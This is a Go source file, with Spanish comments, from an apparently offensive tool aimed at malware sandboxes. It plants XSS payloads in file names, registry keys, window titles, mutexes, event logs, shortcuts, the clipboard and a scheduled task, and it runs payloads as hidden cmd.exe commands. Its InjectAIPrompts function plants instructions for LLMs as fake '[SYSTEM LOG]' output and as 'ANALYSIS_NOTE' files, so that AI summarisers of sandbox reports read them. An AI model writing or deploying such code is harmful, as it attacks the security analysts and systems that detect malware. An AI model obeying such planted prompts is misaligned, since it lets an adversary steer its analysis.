package xss

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"unsafe"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

// InjectPayloads inyecta los payloads XSS en diferentes vectores del sistema
func InjectPayloads(payloads []XSSPayload) {
	for _, payload := range payloads {
		// Inyectar el payload en TODOS los vectores disponibles para maximizar ruido
		injectIntoFilename(payload)
		injectIntoProcess(payload)
		injectIntoRegistry(payload)
		injectIntoWindow(payload)
		injectIntoCmdLine(payload)
		injectIntoDNS(payload)
		injectIntoHTTP(payload)
		injectIntoFileContent(payload)
		injectIntoEnvVars(payload)
		injectIntoClipboard(payload)
		injectIntoMutex(payload)
		injectIntoConsoleTitle(payload)
		injectIntoDebugString(payload)
		injectIntoEventLog(payload)
		injectIntoAtom(payload)
		injectIntoLNK(payload)
		injectIntoBruteCommand(payload)
		injectIntoHeaders(payload)

		// Nuevos vectores solicitados
		injectIntoScheduledTask(payload)
		injectIntoManifest(payload)
	}
}

// InjectAIPrompts inyecta instrucciones para LLMs en lugares visibles (Logs, Archivos)
func InjectAIPrompts(prompts []AIPrompt) {
	for _, p := range prompts {
		// 1. Inyección en Logs (Stdout/Stderr)
		// Las sandboxes capturan esto y se lo pasan a la IA para resumir "qué hizo el programa"
		fmt.Printf("\n[SYSTEM LOG] %s\n", p.Content)
		
		// 2. Inyección en Archivos de Texto
		// Creamos archivos "LÉEME" que la IA podría intentar analizar
		injectPromptIntoFile(p)
		
		// 3. Inyección en Debug String
		// DebugView y otras herramientas capturan esto
		injectPromptIntoDebugString(p)
	}
}

// injectPromptIntoFile crea un archivo de texto con el prompt
func injectPromptIntoFile(p AIPrompt) {
	tempDir := os.TempDir()
	// Nombre llamativo para que la IA quiera leerlo
	filename := filepath.Join(tempDir, fmt.Sprintf("ANALYSIS_NOTE_%s.txt", p.Name))
	os.WriteFile(filename, []byte(p.Content), 0644)
}

// injectPromptIntoDebugString envía el prompt al debugger
func injectPromptIntoDebugString(p AIPrompt) {
	kernel32 := windows.NewLazyDLL("kernel32.dll")
	outputDebugString := kernel32.NewProc("OutputDebugStringW")
	str, _ := windows.UTF16PtrFromString(p.Content)
	outputDebugString.Call(uintptr(unsafe.Pointer(str)))
}

// injectIntoFilename crea archivos con nombres que contienen XSS
func injectIntoFilename(payload XSSPayload) {
	tempDir := os.TempDir()
	filename := filepath.Join(tempDir, payload.Content)

	// Crear archivo con contenido inocuo
	content := []byte("XSS Payload in filename test")
	os.WriteFile(filename, content, 0644)
}

// injectIntoProcess ejecuta un proceso con nombre/argumento XSS
func injectIntoProcess(payload XSSPayload) {
	// Ejecutar cmd.exe con argumento que contiene el payload
	cmd := exec.Command("cmd.exe", "/c", "echo", payload.Content)
	cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
	cmd.Start()
}

// injectIntoRegistry crea una clave de registro con XSS
func injectIntoRegistry(payload XSSPayload) {
	// Crear clave en HKEY_CURRENT_USER\Software\XSSAudit
	key, err := registry.OpenKey(registry.CURRENT_USER, `Software`, registry.CREATE_SUB_KEY)
	if err != nil {
		return
	}
	defer key.Close()

	// Crear subclave con nombre XSS
	subKey, _, err := registry.CreateKey(key, payload.Content, registry.SET_VALUE)
	if err != nil {
		return
	}
	defer subKey.Close()

	// Establecer valor con payload
	subKey.SetStringValue("TestValue", payload.Content)
}

// injectIntoWindow crea una ventana con título XSS
func injectIntoWindow(payload XSSPayload) {
	// Crear ventana invisible con título XSS
	user32 := windows.NewLazyDLL("user32.dll")
	createWindowEx := user32.NewProc("CreateWindowExW")

	className, _ := windows.UTF16PtrFromString("STATIC")
	windowName, _ := windows.UTF16PtrFromString(payload.Content)

	createWindowEx.Call(
		0,                                   // dwExStyle
		uintptr(unsafe.Pointer(className)),  // lpClassName
		uintptr(unsafe.Pointer(windowName)), // lpWindowName
		0,                                   // dwStyle
		0, 0, 0, 0,                          // x, y, width, height
		0, // hWndParent
		0, // hMenu
		0, // hInstance
		0, // lpParam
	)
}

// injectIntoCmdLine ejecuta comando con argumento XSS
func injectIntoCmdLine(payload XSSPayload) {
	// Ejecutar vía CMD (como argumento)
	cmd1 := exec.Command("cmd.exe", "/c", "echo", payload.Content)
	cmd1.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
	cmd1.Start()

	// Ejecutar vía PowerShell (write-output)
	// powershell.exe write-output "payload"
	cmd2 := exec.Command("powershell.exe", "write-output", fmt.Sprintf(`"%s"`, payload.Content))
	cmd2.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
	cmd2.Start()

	// Ejecutar el payload como si fuera un comando (muy ruidoso)
	// cmd.exe /c "payload"
	if len(payload.Content) < 250 { // Evitar errores de longitud excesiva
		cmd3 := exec.Command("cmd.exe", "/c", payload.Content)
		cmd3.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		cmd3.Start()
	}
}

// injectIntoEnvVars crea variables de entorno con XSS
func injectIntoEnvVars(payload XSSPayload) {
	// Crear variable de entorno con nombre único
	envName := "MALWARE_" + payload.ID[:8]
	os.Setenv(envName, payload.Content)

	// Crear variables comunes que aparecen en reportes
	os.Setenv("MALWARE_C2", payload.Content)
	os.Setenv("MALWARE_ID", payload.Content)
	os.Setenv("ANALYSIS_DATA", payload.Content)
	os.Setenv("XSS_TEST", payload.Content)
}

// injectIntoClipboard copia el payload al portapapeles
func injectIntoClipboard(payload XSSPayload) {
	// Usamos PowerShell para no depender de librerías externas complejas
	cmd := exec.Command("powershell", "-Command", fmt.Sprintf("Set-Clipboard -Value '%s'", payload.Content))
	cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
	cmd.Start() // Start no bloquea la ejecución
}

// injectIntoMutex crea un Mutex con nombre malicioso
func injectIntoMutex(payload XSSPayload) {
	kernel32 := windows.NewLazyDLL("kernel32.dll")
	createMutex := kernel32.NewProc("CreateMutexW")

	name, _ := windows.UTF16PtrFromString(payload.Content)
	// CreateMutexW(lpMutexAttributes, bInitialOwner, lpName)
	// No cerramos el handle para que el mutex persista durante la ejecución
	createMutex.Call(0, 0, uintptr(unsafe.Pointer(name)))
}

// injectIntoConsoleTitle cambia el título de la consola
func injectIntoConsoleTitle(payload XSSPayload) {
	kernel32 := windows.NewLazyDLL("kernel32.dll")
	setConsoleTitle := kernel32.NewProc("SetConsoleTitleW")

	name, _ := windows.UTF16PtrFromString(payload.Content)
	setConsoleTitle.Call(uintptr(unsafe.Pointer(name)))
}

// injectIntoDebugString envía el payload a un debugger
func injectIntoDebugString(payload XSSPayload) {
	kernel32 := windows.NewLazyDLL("kernel32.dll")
	outputDebugString := kernel32.NewProc("OutputDebugStringW")

	str, _ := windows.UTF16PtrFromString(payload.Content)
	outputDebugString.Call(uintptr(unsafe.Pointer(str)))
}

// injectIntoEventLog crea una entrada en el visor de eventos
func injectIntoEventLog(payload XSSPayload) {
	// Usamos eventcreate.exe (nativo de Windows)
	// ID 100, Tipo INFORMATION, Origen XSSAudit
	cmd := exec.Command("eventcreate", "/ID", "100", "/L", "APPLICATION", "/T", "INFORMATION", "/SO", "XSSAudit", "/D", payload.Content)
	cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
	cmd.Start()
}

// injectIntoAtom añade un string a la tabla de átomos global
func injectIntoAtom(payload XSSPayload) {
	kernel32 := windows.NewLazyDLL("kernel32.dll")
	globalAddAtom := kernel32.NewProc("GlobalAddAtomW")

	str, _ := windows.UTF16PtrFromString(payload.Content)
	globalAddAtom.Call(uintptr(unsafe.Pointer(str)))
}

// injectIntoLNK crea un acceso directo con descripción maliciosa
func injectIntoLNK(payload XSSPayload) {
	tempDir := os.TempDir()
	lnkPath := filepath.Join(tempDir, fmt.Sprintf("Readme_%s.lnk", payload.ID[:8]))

	// Script de PowerShell para crear el LNK usando COM
	psScript := fmt.Sprintf(`$s=(New-Object -COM WScript.Shell).CreateShortcut('%s');$s.TargetPath='notepad.exe';$s.Description='%s';$s.Save()`, lnkPath, payload.Content)

	cmd := exec.Command("powershell", "-Command", psScript)
	cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
	cmd.Start()
}

// injectIntoBruteCommand ejecuta comandos ruidosos con el payload como argumento
func injectIntoBruteCommand(payload XSSPayload) {
	// 1. Ejecutar vía cmd.exe (shell) para que quede en logs de proceso
	// Esto generará una línea de comandos tipo: cmd.exe /c echo "><img src=...>"
	cmd1 := exec.Command("cmd.exe", "/c", "echo", payload.Content)
	cmd1.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
	cmd1.Start()

	// PowerShell New-Item (crear archivo con nombre de payload)
	// powershell.exe New-Item -Path 'payload' -ItemType File
	psCmd := fmt.Sprintf(`New-Item -Path '%s' -ItemType File`, payload.Content)
	cmd2 := exec.Command("powershell.exe", "-Command", psCmd)
	cmd2.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
	cmd2.Start()

	// 2. Ejecutar calc.exe pasando el XSS como argumento
	// Esto es muy ruidoso y aparecerá en los logs de EDR como argumento sospechoso
	cmd3 := exec.Command("calc.exe", payload.Content)
	cmd3.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
	cmd3.Start()

	// 3. Intentar "abrir" el payload como si fuera un archivo/URL
	// Esto fuerza al explorador a procesar el string
	cmd4 := exec.Command("explorer.exe", payload.Content)
	cmd4.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
	cmd4.Start()
}

// injectIntoScheduledTask crea una tarea programada con el payload
func injectIntoScheduledTask(payload XSSPayload) {
	// schtasks /create /tn "Payload" /tr "Payload" /sc minute
	// Usamos el ID para el nombre de la tarea para evitar errores de sintaxis, pero el comando es el payload
	taskName := "Update_" + payload.ID[:8]

	// Intentamos poner el payload en el comando a ejecutar
	cmd := exec.Command("schtasks", "/create", "/tn", taskName, "/tr", payload.Content, "/sc", "ONCE", "/st", "00:00", "/f")
	cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
	cmd.Start()
}
